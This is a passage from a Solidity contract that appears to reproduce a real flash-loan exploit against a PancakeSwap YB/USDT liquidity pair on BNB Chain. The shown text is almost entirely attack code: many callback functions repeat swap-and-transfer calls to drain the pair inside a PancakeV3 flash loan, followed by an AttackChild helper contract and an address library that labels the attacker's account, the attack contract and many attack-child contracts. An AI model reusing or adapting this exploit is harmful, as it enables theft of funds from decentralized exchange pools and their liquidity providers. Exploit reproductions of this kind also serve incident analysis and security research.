            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 589519202775168013993, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 591580058537601523914, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 593651457506599705124, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
    }

    function flashCallback34() internal {
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 595733465504682939122, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 597826148790036912082, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 599929574058828070881, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
    }

    function flashCallback35() internal {
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 602043808447511585263, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 604168919535131148077, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 606304975345609926628, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 608452044350031958639, address(this), hex"");
    }

    function flashCallback36() internal {
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 610610195468913266650, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 612779498074461944166, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 614960021992826446223, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
    }

    function flashCallback37() internal {
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 617151837506331295691, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 619355015355699394947, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 621569626742260110256, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
    }

    function flashCallback38() internal {
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 623795743330142273436, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 626033437248451222138, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 628282781093428976284, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 630543847930596623785, address(this), hex"");
    }

    function flashCallback39() internal {
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 632816711296877963840, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 635101445202703430677, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 637398124134093294470, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
    }

    function flashCallback40() internal {
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 625363312632310733157, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 603295011969659793498, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 582357595645667567518, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
    }

    function flashCallback41() internal {
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 562475654820856312370, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 543579935782488952844, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 525606748471005478418, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 508497440137382843722, address(this), hex"");
    }

    function flashCallback42() internal {
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 492197926074087993759, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 476658270465293392134, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 461832311339919282876, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
    }

    function flashCallback43() internal {
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 447677324410621449102, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 434153721265160489433, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 421224777961976641668, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
    }

    function flashCallback44() internal {
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 408856390584461526014, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 397016854741034244587, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 385676666371276982455, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 374808341540928080820, address(this), hex"");
    }

    function flashCallback45() internal {
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 364386253187910965682, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 354386483024060204957, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 344786687008077759646, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
    }

    function flashCallback46() internal {
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 335565972988984493950, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 326704789279714756835, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 318184823060755942707, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
    }

    function flashCallback47() internal {
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 309988907636602677806, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 302100937675616628806, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 294505791658658668057, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 287189260845304444366, address(this), hex"");
    }

    function flashCallback48() internal {
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 280137984139662868580, address(this), hex"");
        IERC20Like(Addresses.USDT).balanceOf(address(this));
        {
            uint256 usdtToPair = 19209600000000000000000;
            IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool, usdtToPair);
        }
    }

    receive() external payable {}

    function pancakeV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external payable {
        amount0;
        amount1;
        data;
        if (!flashFlowStarted) flashCallback();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        if (msg.sig == 0x12a52ed4) {
            _startFlashLoan();
            bytes memory ret = abi.encode(uint256(26229577432433534433), uint256(22910404));
            assembly { return(add(ret, 32), mload(ret)) }
        }
        acceptFallback();
    }

    function acceptFallback() internal {}

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }

    bool private flashFlowStarted;

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

contract AttackChild {
    receive() external payable {}

    fallback() external payable {
        acceptFallback();
    }

    function acceptFallback() internal {}

    function approveYbForAttack() external {
        IERC20Like(Addresses.YB).approve(Addresses.attack_contract, type(uint256).max);
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant attacker_eoa = 0x00000000b7dA455FEd1553C4639c4B29983d8538;
    address internal constant YB = 0x04227350eDA8Cb8b1cFb84c727906Cb3CcBff547;
    address internal constant A_045B08_170A = 0x045B0821EfD2AEE20d3fd7F3De06319b114b170A;
    address internal constant A_04DBA8_3E2D = 0x04dba8b34696675a518f95B3503478E7672B3E2d;
    address internal constant attack_child = 0x05607d56aC24fE7FD73778e2E66a377f90EBd9bE;
    address internal constant attack_child_D772 = 0x06615cF9f92939914E86190b170586Ad39aBd772;
    address internal constant A_071783_8E1A = 0x0717831b88f419910437193A44fd014F0D958e1A;
    address internal constant attack_child_BA0E = 0x08920d3dc7ecC818525c9DE91e583352A65Aba0E;
    address internal constant attack_child_20CA = 0x08f6B1eA9D18a16155711acc835C6149A1d520CA;
    address internal constant attack_child_125F = 0x0961e9fD47bc95013c5167720d50642FAaf3125f;
    address internal constant A_0A7EBB_3396 = 0x0A7EBB0232f4e51E312Dd64058512b539a9E3396;
    address internal constant attack_child_AA0C = 0x0Ae48585Da76296068BEd41C3Fb1616E6BBbaA0C;
    address internal constant A_0BE407_D1DD = 0x0bE407abBA6dfaB590F0DB7ddd59a108fC8fd1Dd;
    address internal constant PancakeV3Factory = 0x0BFbCF9fa4f9C56B0F40a671Ad40E0805A091865;
    address internal constant A_0C84AE_566D = 0x0C84AeB84592D1d57cb61668f47194432766566D;
    address internal constant attack_child_61D7 = 0x0C8f268aafD4f1e7ED3595db8A74Dcc3792661D7;
    address internal constant A_0D163B_A95F = 0x0D163bbDe68AAED1BE55F6cb170D82A887AdA95F;
    address internal constant attack_child_B367 = 0x0e894079b2A53279D5BB9527c8954FE97079B367;
    address internal constant attack_child_1DDE = 0x0f49F7d29aC868D4b0015E92EB9D14b344F71Dde;
    address internal constant A_107842_61FA = 0x10784219250ada5F0dd28b841819e89eAe4961FA;
    address internal constant attack_child_1B19 = 0x10De68dB890eECd7c05a0200D319f6e80bB81B19;
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant attack_child_07A8 = 0x1132D8c6b2A3B6E56F43d3A9a24aFd6d876D07A8;
    address internal constant A_113DD2_0F29 = 0x113Dd20FA17cD59F5885a1f9e263DCF25F570f29;
    address internal constant A_113F16_E434 = 0x113F16A3341D32c4a38Ca207Ec6ab109cF63e434;
    address internal constant A_1199D0_44D5 = 0x1199d0963191fC32a013a7F5Bb7A2121a9ec44D5;
    address internal constant A_12D64A_4561 = 0x12D64AdcaF75C1D227224C2aefcA0878A4994561;
    address internal constant A_14721B_5CDF = 0x14721B251B0098b49464F630Aa73B23442aB5cdf;
    address internal constant A_14748D_B805 = 0x14748d46F4d67e713C854581375222428f89B805;
    address internal constant Cake_LP = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
    address internal constant A_1798F0_9633 = 0x1798f0acC28F8bceF741E13407770063107f9633;
    address internal constant A_1A90A5_B76D = 0x1a90a54089a581751e450d5d4aB4c988cA75b76d;
    address internal constant A_1C3E9C_026B = 0x1C3e9c7204C403618a213131acEC17256AB9026b;
    address internal constant A_1CCBAA_EDA1 = 0x1ccBaAC1553D2D4dE19f0Fcf4d9DcbBE0623EDA1;
    address internal constant attack_child_C6DD = 0x1Fb2B01e8B9a53b973f9c4f28773BC0a3cA4c6dd;
    address internal constant A_2016E5_AD1A = 0x2016e5953C2A2529005a001060Fb1892CDC8Ad1A;
    address internal constant attack_child_2156 = 0x213d3cF68a85a35B27E1E4dd9D651c7D77102156;
    address internal constant A_22D07E_F7FA = 0x22d07e8Ce75e44Db64c1030D9B4d76f1061dF7FA;
    address internal constant A_275644_27BF = 0x275644EA3F065693678B29f0d8BE00795a4D27bf;
    address internal constant attack_child_E2AC = 0x2A682867873FFa345e822743c4e56D26B37dE2AC;
    address internal constant A_2C6C9E_E9B3 = 0x2C6c9ed555d19c48869C5a78EE5ECeD7F79Ee9b3;
    address internal constant A_2F0630_4525 = 0x2F0630B016b8A5F39AC5887297F1e5C80C0F4525;
    address internal constant A_2F4B31_F97B = 0x2f4b31Af2597Bc7cA60eD47738344A7F5ea6f97B;
    address internal constant A_327737_BE8B = 0x32773754Cda6aB596299Acd109E67c776550BE8B;
    address internal constant attack_child_680E = 0x335Ea4675ab451E09AF486c0b57C971401f0680e;
    address internal constant PancakeV3Pool = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;
    address internal constant Cake_LP_350A = 0x38231F8Eb79208192054BE60Cb5965e34668350A;
    address internal constant A_3907E3_360C = 0x3907E3AD05317F17494Ff5AeE7f126937b23360C;
    address internal constant attack_child_58C2 = 0x3A1bF36E149fA5CFcB9E1D5fAD55FBa6A30c58C2;
    address internal constant attack_child_B529 = 0x3a794899a6Dc666cccb0Ecbea4CCCaF21383B529;
    address internal constant attack_child_D77B = 0x3Cd4Be98A6301246047b310485847A796bC8D77B;
    address internal constant attack_child_EA30 = 0x3DbD838E2C30C82dd144162927A9Fe579e9beA30;
    address internal constant A_3E3628_780F = 0x3E3628F34094066e846987e7728d90963A92780f;
    address internal constant A_427C90_9CB8 = 0x427c902c0aC46ccB8A2BD8253D33c14849DE9CB8;
    address internal constant A_4353A9_20C5 = 0x4353a9E8Cc492678b7e993216659499Ed28020c5;
    address internal constant A_4B621F_9361 = 0x4B621f937CB63A8a9B1534816e9AcD18c3159361;
    address internal constant A_4C797A_C3BD = 0x4C797A1d8c882Ffaa6d89876BA1cC3CF82f7c3Bd;
    address internal constant A_4EE408_02B9 = 0x4eE408d02d061FADa74E1bd5378AFf2f868C02B9;
    address internal constant A_520879_3C36 = 0x5208790805f9B2dDC456050DDA2B0F4e83EA3C36;
    address internal constant A_554315_E57F = 0x55431547534e934F5f3400b514a53f2982deE57f;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant A_56D04C_1F29 = 0x56d04cF31a871b9045481A03CBE4EcB104e21F29;
    address internal constant attack_child_87C1 = 0x596735a6AE06A9d66696Ef00B1C2403dde5187C1;
    address internal constant attack_child_31E3 = 0x5c1009aa6925B274cCca72834eb75737E80c31e3;
    address internal constant A_5D1155_D2F6 = 0x5D1155c6038474C78124D8677DD35D660583d2F6;
    address internal constant A_5FECCC_8C81 = 0x5fecCc5362aceD995d725a1610d5B31CB1d78C81;
    address internal constant A_620326_83B8 = 0x6203266dd093A6aD5a7846C936BE715Dfc2783b8;
    address internal constant A_643373_05C7 = 0x6433731aa9d6a4025e43d5A236721109814405C7;
    address internal constant A_669A36_5E15 = 0x669a3682194EeFABE07AbaB67AE8ddAB84575e15;
    address internal constant attack_child_C533 = 0x67D994A1Ebdf569598EcE434A6458926b31Ac533;
    address internal constant A_6820F3_64B3 = 0x6820f3DfE24CC322bdBE649E40311e5e6E9964b3;
    address internal constant A_69A18B_098E = 0x69a18B19f26878cEfe6d3571abAD15E888b3098e;
    address internal constant A_6C338C_510A = 0x6C338CFE73C67F6eCaDC489B4900991b30C6510a;
    address internal constant attack_child_5A7A = 0x6E1aa3E651fE8033E426652D3e61C5FDFCF65a7A;
    address internal constant A_6E2768_1CF6 = 0x6e2768fb4F27A5c3394b1B9291Cb466a0bf21CF6;
    address internal constant attack_child_4632 = 0x6Ee7Ff557B6E4b839bfD5860B0D4249BbD064632;
    address internal constant A_712BC8_AF8D = 0x712BC8574D77F381364cbDb1fDfA45Dbad06aF8D;
    address internal constant A_7183D7_F2A6 = 0x7183d7A396851547D6d5301127cA283818BcF2A6;
    address internal constant attack_child_691D = 0x737E32C958298DCb79cB9f5D91579D8C8076691D;
    address internal constant attack_child_71EF = 0x746A04ffb861fF581590019Da960c92C36F471EF;
    address internal constant A_7526F8_42B7 = 0x7526f86cf5fD1f9dD1a2B4AA35D1B9c978a942b7;
    address internal constant attack_child_A69D = 0x761D68eB8F331cD198B9643C35FC48A2E864a69D;
    address internal constant A_762E50_C32B = 0x762E501d6F549E0320187f9c7cFEbBc2249eC32b;
    address internal constant attack_child_6B79 = 0x779a73D0D86a685E4778093A191ed942760b6B79;
    address internal constant attack_child_6767 = 0x78AcFc4D6e000da6758bF91c7fcF6cE9BC0d6767;
    address internal constant attack_child_2099 = 0x790abb58a29A861E547AC535b88bD95eb7602099;
    address internal constant A_7A8B6D_D89C = 0x7A8b6D2860Dcb017Fdb219fAC5745875eEFFd89C;
    address internal constant A_7B1D28_DAD2 = 0x7b1d2809a8a0352eBFE47Ec14AeF41CB437ddad2;
    address internal constant A_7CB21E_BD36 = 0x7cB21e7865288D3b3A5465CEc0F2a2D8CCD4BD36;
    address internal constant attack_child_AAE5 = 0x7e6E7A1F80131AcFbAFFA3cE8E1Cce72B129aAe5;
    address internal constant A_7E89F1_A995 = 0x7e89F198C65Cf8bde9c9985ADDe82ABe23f1a995;
    address internal constant A_7F4720_BB0E = 0x7F4720904bBeb875a2c9f8F792f5838D2adCbB0e;
    address internal constant attack_child_B261 = 0x7faB058e0587FF0Ef9A81Bb775F4949d937CB261;
    address internal constant A_818696_79C7 = 0x818696BeAb0f3F97bd1BC2D352c45f5c022379c7;
    address internal constant A_81E190_B5EC = 0x81e190F176F7aE69a7Afd7bD7EEf2354879Db5Ec;
    address internal constant A_8CF7D2_502E = 0x8CF7D229Ae54E0e1f8DD1962956455748E81502e;
    address internal constant attack_child_0411 = 0x8E0cC3D79d0Ca427F67FA09BD9c6A673A30C0411;
    address internal constant A_8EF86A_6B04 = 0x8eF86Ad0FaA2b8685a2D2FdAd011B7f08A836B04;
    address internal constant attack_child_6057 = 0x8F7240ABA92B174c6bb9FCec2CaB45BD569c6057;
    address internal constant attack_child_265C = 0x9161D0D32CC1a8eD5c5AFe770fC2465De77e265c;
    address internal constant attack_child_461E = 0x9497cdb23421A9D700eD37f1B72400859eC1461E;
    address internal constant attack_child_1A2A = 0x956D2fa3c2C089206E13ae073ED5A1b2578a1A2A;
    address internal constant attack_child_C44D = 0x97b0Ce0B68263e6748a5d231DE5AFec3Fe19c44d;
    address internal constant attack_child_A6FA = 0xa09dE3dAb25B598C1bCe83e37C7e1666dFB6a6fA;
    address internal constant attack_child_5D54 = 0xa0A0dB8a061aB7B8227b1d7f3b25B10a19E35D54;
    address internal constant attack_child_79BC = 0xa3e3DcA00B88454cC29E4773e97F46a6E35D79BC;
    address internal constant A_A59212_27A2 = 0xA5921276292B988f4ce6cE6d1accA54A18f927A2;
    address internal constant A_A7B462_B209 = 0xa7b4629B2dD2eecED5D32EBc3d714fB210Aab209;
    address internal constant attack_child_C701 = 0xa7E0bC3067A8983B7660Aa8f1a20e3F3091dC701;
    address internal constant attack_child_59F6 = 0xAdbE2975F5F3B6c9f23512932e7E99f0142759F6;
    address internal constant attack_child_FF38 = 0xAe464Fca4f0C3684c72D58cDE0506Af67765FF38;
    address internal constant A_AE86D4_08B3 = 0xae86D446A8707CaEf472c6864520feC9aa2308B3;
    address internal constant A_AEE180_96FC = 0xAee18065542cad6114ded5dcFC42f74303C396Fc;
    address internal constant attack_child_ED2C = 0xB318eB68361EA1A7aBf960B7A0d6E2cabC4Eed2C;
    address internal constant A_B3AB09_A6B8 = 0xb3AB0931b05bcBCeC66D519112850024185EA6b8;
    address internal constant attack_child_B752 = 0xb55b09009eCf8E3d4b9c3483168a66f78319b752;
    address internal constant attack_child_030D = 0xB5CF9cFe01C1116B90aA597bC74d8A411E87030D;
    address internal constant A_B64F4C_677F = 0xB64f4c39153Fc48ECf8b00Fb97aAB4087138677F;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant A_BA2690_E159 = 0xba2690D8C341CEF479970E3E2F1E5E6B1Ac2e159;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant attack_child_5D8E = 0xBC237B85a8eD338d4DE2746F302A4939A4685d8E;
    address internal constant attack_contract = 0xBDCD584eC7B767A58Ad6A4C732542b026DCEAa35;
    address internal constant A_BF4E68_D5B5 = 0xBF4E6854E3539702C23E2b111e9D5C6C380CD5B5;
